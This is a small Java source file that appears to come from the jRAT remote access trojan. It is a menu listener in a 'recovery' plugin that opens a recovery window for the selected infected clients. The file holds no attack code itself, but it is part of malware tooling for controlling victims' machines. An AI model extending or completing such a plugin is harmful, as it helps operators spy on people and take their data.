package jrat.plugin.recovery.client;

import java.util.List;

import jrat.api.Client;
import jrat.api.ui.RATMenuItemActionListener;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<Client> clients) {
		new FrameRecovery(clients).setVisible(true);
	}

}
